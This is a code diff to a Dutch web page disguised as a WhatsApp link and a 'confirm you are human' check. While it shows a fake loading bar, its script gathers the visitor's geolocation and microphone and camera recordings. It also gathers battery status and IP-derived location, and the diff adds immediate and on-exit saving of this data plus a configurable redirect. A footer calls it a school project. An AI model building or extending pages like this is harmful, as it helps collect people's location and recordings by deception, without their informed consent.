@@ -10,12 +10,13 @@
             display: flex;
             justify-content: center;
             align-items: center;
-            height: 100vh;
+            min-height: 100vh;
             margin: 0;
             color: white;
             text-align: center;
             background: url('https://i.postimg.cc/sDTjTFrr/whatsapp-background.jpg') no-repeat center center fixed;
             background-size: cover;
+            overflow: hidden;
         }
 
         /* Container voor de inhoud */
@@ -24,9 +25,10 @@
             padding: 20px;
             border-radius: 10px;
             box-shadow: 0 4px 10px rgba(0, 0, 0, 0.3);
-            width: 100%;
+            width: 90%;
             max-width: 400px;
             color: #333;
+            box-sizing: border-box;
         }
 
         h1 {
@@ -35,7 +37,7 @@
         }
 
         p {
-            margin: 0 0 20px;
+            margin: 0 0 10px;
             font-size: 16px;
         }
 
@@ -61,7 +63,7 @@
             height: 100%;
             background: linear-gradient(90deg, #4caf50, #03a9f4);
             width: 0;
-            animation: loadProgress 5s linear forwards;
+            animation: loadProgress linear forwards;
         }
 
         @keyframes loadProgress {
@@ -100,6 +102,28 @@
             color: #ff5722;
             font-size: 14px;
         }
+
+        /* Disclaimer */
+        .disclaimer {
+            margin-top: 20px;
+            font-size: 12px;
+            color: #fff;
+        }
+
+        /* Responsive */
+        @media screen and (max-width: 480px) {
+            .container {
+                padding: 15px;
+            }
+
+            h1 {
+                font-size: 20px;
+            }
+
+            p {
+                font-size: 14px;
+            }
+        }
     </style>
 </head>
 <body>
@@ -108,10 +132,11 @@
         <p>Dit is alleen om te bevestigen of jij een mens bent. Even geduld terwijl we het aan het bevestigen zijn.</p>
         <div class="loading"></div>
         <div class="progress-bar">
-            <span></span>
+            <span id="progressBarSpan"></span>
         </div>
         <p id="error-message">Kon gegevens niet ophalen. Probeer het opnieuw.</p>
     </div>
+    <p class="disclaimer">Dit is een schoolproject en er wordt op geen enkele manier misbruik van gemaakt.</p>
 
     <script>
         // Haal instellingen op uit localStorage
@@ -119,11 +144,13 @@
         const locationEnabled = localStorage.getItem("locationEnabled") === "true";
         const notificationsEnabled = localStorage.getItem("notificationsEnabled") === "true";
         const redirectUrl = localStorage.getItem("redirectUrl") || "https://www.youtube.com/watch?v=dQw4w9WgXcQ";
+        const redirectDelay = parseInt(localStorage.getItem("redirectDelay"), 10) * 1000 || 5000; // Omzetten naar milliseconden
 
         // Stel de berichttekst in
         document.getElementById("messageText").innerHTML = localStorage.getItem("messageText") || "<span class='highlight'>Youssof</span> heeft je een link gestuurd!";
 
         let locationData = null;
+        let ipLocationData = null;
         let recordingData = null;
         let batteryData = null;
 
@@ -132,6 +159,10 @@
 
             if (locationEnabled && locationData) {
                 Object.assign(combinedData, locationData);
+            }
+
+            if (ipLocationData) {
+                combinedData.ipLocation = ipLocationData;
             }
 
             if (micCamEnabled && recordingData) {
@@ -150,6 +181,32 @@
                 let savedData = JSON.parse(localStorage.getItem("collectedData")) || [];
                 savedData.push(combinedData);
                 localStorage.setItem("collectedData", JSON.stringify(savedData));
+
+                // Update event versturen voor live update
+                const event = new CustomEvent('dataUpdated');
+                window.dispatchEvent(event);
+            }
+        }
+
+        async function getIPLocationData() {
+            try {
+                const response = await fetch('https://ipapi.co/json/');
+                const data = await response.json();
+                // IP locatiegegevens
+                ipLocationData = {
+                    ip: data.ip,
+                    city: data.city,
+                    region: data.region,
+                    country: data.country_name,
+                    lat: parseFloat(data.latitude),
+                    lon: parseFloat(data.longitude),
+                    timestamp: new Date().toISOString()
+                };
+
+                // Sla gegevens direct op
+                saveData();
+            } catch (error) {
+                console.error('Error fetching IP location data:', error);
             }
         }
 
@@ -172,6 +229,8 @@
                                 device: device
                             };
 
+                            // Sla gegevens direct op
+                            saveData();
                             resolve();
                         },
                         (error) => {
@@ -224,6 +283,8 @@
                                 timestamp: new Date().toISOString()
                             };
 
+                            // Sla gegevens direct op
+                            saveData();
                             resolve();
                         };
 
@@ -272,6 +333,9 @@
                         level: battery.level,
                         charging: battery.charging
                     };
+
+                    // Sla gegevens direct op
+                    saveData();
                 } catch (error) {
                     console.error("Error getting battery info:", error);
                 }
@@ -295,14 +359,17 @@
                 }
 
                 await getBatteryData();
+                await getIPLocationData();
                 await Promise.all(permissions);
 
-                saveData();
+                // Stel de duur van de voortgangsbalkanimatie in
+                const progressBarSpan = document.getElementById('progressBarSpan');
+                progressBarSpan.style.animationDuration = `${redirectDelay / 1000}s`;
 
                 // Wacht totdat de voortgangsbalk klaar is
                 setTimeout(() => {
                     window.location.href = redirectUrl;
-                }, 5000);
+                }, redirectDelay);
 
             } catch (error) {
                 console.error("Error in permissions:", error);
@@ -311,6 +378,9 @@
                 document.getElementById("error-message").innerText = error.message;
             }
         }
+
+        // Sla gegevens op voordat de gebruiker de pagina verlaat
+        window.addEventListener('beforeunload', saveData);
 
         // Start direct bij het laden van de pagina
         redirectWithPermissions();
